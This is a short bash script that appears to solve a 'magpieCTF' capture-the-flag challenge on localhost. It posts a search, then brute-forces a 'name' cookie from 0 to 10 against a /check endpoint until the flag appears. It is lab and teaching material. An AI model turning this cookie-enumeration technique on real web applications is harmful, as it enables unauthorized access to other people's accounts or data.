#!/bin/bash

CTF_HOST="localhost"  


curl -s -X POST -d "query=casefile" -c cookies.txt http://$CTF_HOST/search > /dev/null


for i in {0..10}; do
    
    RESPONSE=$(curl -s -b "name=$i" http://$CTF_HOST/check)

    
    if echo "$RESPONSE" | grep -q "magpieCTF"; then
        echo "Flag found: $(echo "$RESPONSE" | grep -o 'magpieCTF{.*}')"
        break
    fi
done
